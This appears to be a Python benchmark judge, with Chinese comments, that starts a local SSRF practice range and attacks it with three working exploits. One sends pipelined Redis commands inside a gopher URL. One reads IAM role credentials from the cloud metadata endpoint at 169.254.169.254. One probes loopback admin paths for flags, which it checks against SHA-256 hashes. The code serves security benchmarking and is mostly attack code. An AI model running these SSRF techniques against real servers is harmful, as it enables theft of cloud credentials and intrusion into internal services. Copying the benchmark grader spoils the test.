#!/usr/bin/env python3
"""SSRF 利用基准 —— Python 侧独立机验（Go ssrf_attack.go 的双语言复刻）。

不复用 Go 任何代码：纯标准库实现 gopher RESP 管道化 / 云元数据两跳 /
内网回环服务三种 SSRF 攻击，对 ssrf_range.py 靶场实测，
命中以 SHA-256 比对（基准集只存哈希，不存明文 flag）。

用法: python judge_ssrf.py
"""

import hashlib
import json
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
RANGE_PY = os.path.join(HERE, "live_target", "ssrf_range.py")
BENCH = os.path.join(HERE, "ssrf_benchmark.json")
PORT = "18190"

RE_FLAG = re.compile(r"flag\{[^}\x00-\x1f\x7f]{4,}\}|[A-Z][A-Z0-9]{2,15}\{[^}\x00-\x1f\x7f]{4,}\}",
                     re.IGNORECASE)


def sh(s: str) -> str:
    return hashlib.sha256(s.encode()).hexdigest()


def fetch(url, timeout=10):
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read().decode("utf-8", "replace")
        except Exception:
            return e.code, ""
    except Exception:
        return 0, ""


def wait_ready(port, tries=100):
    for _ in range(tries):
        st, _ = fetch(f"http://127.0.0.1:{port}/", timeout=1)
        if st:
            return True
        time.sleep(0.1)
    return False


def resp_encode(*args):
    """编码 RESP 数组（Redis 多批量协议）。"""
    out = b"*%d\r\n" % len(args)
    for a in args:
        a = a.encode() if isinstance(a, str) else a
        out += b"$%d\r\n%s\r\n" % (len(a), a)
    return out


def gopher_url(host, port, raw: bytes) -> str:
    return "gopher://%s:%d/_%s" % (host, port, urllib.parse.quote(raw, safe=""))


def ssrf(base: str, scene: str, url: str) -> str:
    """经靶机 fetch 代理发起请求（SSRF 本体）。"""
    _, body = fetch(f"{base}/{scene}/fetch?url={urllib.parse.quote(url, safe='')}")
    return body


def exploit_redis(base, desc):
    """gopher RESP 管道：KEYS 枚举 → 逐键 GET。"""
    # 先管道 KEYS * 与常见键名 GET
    cmd = resp_encode("KEYS", "*")
    for k in ("backup:flag", "flag", "secret", "flag:db", "backup"):
        cmd += resp_encode("GET", k)
    body = ssrf(base, "ssrf_redis", gopher_url("127.0.0.1", 6399, cmd))
    found = RE_FLAG.findall(body)
    if found:
        return found
    # 兜底：解析 KEYS 键名再逐个 GET
    keys = re.findall(r"\$%?(\d+)\r\n([A-Za-z0-9:_\-\.]+)\r\n", body)
    seen, cmd = set(), b""
    for _, k in keys:
        if k not in seen:
            seen.add(k)
            cmd += resp_encode("GET", k)
    if cmd:
        body = ssrf(base, "ssrf_redis", gopher_url("127.0.0.1", 6399, cmd))
        return RE_FLAG.findall(body)
    return []


def exploit_cloud(base, desc):
    """云元数据两跳：角色列表 → 凭证 JSON。"""
    _, role = fetch(f"{base}/ssrf_cloud/fetch?url="
                    + urllib.parse.quote("http://169.254.169.254/latest/meta-data/iam/security-credentials/", safe=""))
    role = role.strip()
    found = []
    if role:
        _, body = fetch(f"{base}/ssrf_cloud/fetch?url="
                        + urllib.parse.quote(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}", safe=""))
        found += RE_FLAG.findall(body)
    # 常见兜底路径
    for p in ("/latest/meta-data/iam/security-credentials/iam-role",
              "/latest/meta-data/security-credentials"):
        _, body = fetch(f"{base}/ssrf_cloud/fetch?url=" + urllib.parse.quote("http://169.254.169.254" + p, safe=""))
        found += RE_FLAG.findall(body)
    return found


def exploit_internal(base, desc):
    """内网回环 admin 服务：经 fetch 代理转发（token 由代理注入）。"""
    found = []
    for port in (6401, 6402, 8080):
        for path in ("/internal/flag", "/admin/flag", "/flag"):
            _, body = fetch(f"{base}/ssrf_internal/fetch?url="
                            + urllib.parse.quote(f"http://127.0.0.1:{port}{path}", safe=""))
            found += RE_FLAG.findall(body)
    return found


EXPLOITERS = {
    "ssrf_redis": exploit_redis,
    "ssrf_cloud": exploit_cloud,
    "ssrf_internal": exploit_internal,
}


def main():
    if not os.path.exists(BENCH) or not os.path.exists(RANGE_PY):
        print("缺少 ssrf_benchmark.json 或 ssrf_range.py", file=sys.stderr)
        return 1
    doc = json.load(open(BENCH, encoding="utf-8"))["problems"]

    proc = subprocess.Popen([sys.executable, RANGE_PY, PORT],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        if not wait_ready(PORT):
            print("靶场未就绪", file=sys.stderr)
            return 1
        base = f"http://127.0.0.1:{PORT}"
        hit = 0
        for pid in sorted(doc):
            found = EXPLOITERS[pid](base, doc[pid]["description"])
            ok = any(sh(f) == doc[pid]["flag_sha256"] for f in found)
            hit += 1 if ok else 0
            print(f"{pid:<14} {'SHA-256 校验通过' if ok else 'MISS'}  (候选 {len(found)})")
        print(f"SSRF 利用基准（Python 侧独立复刻）: {hit}/{len(doc)}")
        return 0 if hit == len(doc) else 1
    finally:
        proc.kill()


if __name__ == "__main__":
    sys.exit(main())
